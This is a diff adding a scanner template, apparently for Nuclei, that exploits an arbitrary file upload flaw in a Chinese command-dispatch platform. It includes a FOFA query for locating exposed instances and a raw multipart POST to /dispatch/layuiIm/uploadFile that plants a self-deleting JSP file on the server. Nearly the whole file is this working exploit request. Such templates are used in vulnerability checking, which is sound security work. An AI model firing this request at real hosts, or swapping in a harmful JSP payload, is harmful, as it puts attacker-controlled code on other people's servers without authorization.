@@ -1,0 +1,65 @@
+id: poc-bl0g9itmmpk4mxz8
+info:
+  name: 可视化融合指挥调度平台 dispatch 任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/bl0g9itmmpk4mxz8'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: bl0g9itmmpk4mxz8
+    fofa: body="/favicon.ico#/login"
+http:
+- raw:
+  - 'POST /dispatch/layuiIm/uploadFile HTTP/1.1
+
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+
+    Connection: close
+
+
+    Content-Type: multipart/form-data; boundary=----HJBFIUERGBFUYERBVYUBBhbvuyvvtyckuhij
+
+
+
+
+    ------HJBFIUERGBFUYERBVYUBBhbvuyvvtyckuhij
+
+
+    Content-Disposition: form-data; name="file";filename="dudesuite.jsp"
+
+
+
+
+    <% out.println("dudesuite!");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+
+
+    ------HJBFIUERGBFUYERBVYUBBhbvuyvvtyckuhij--
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    other
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
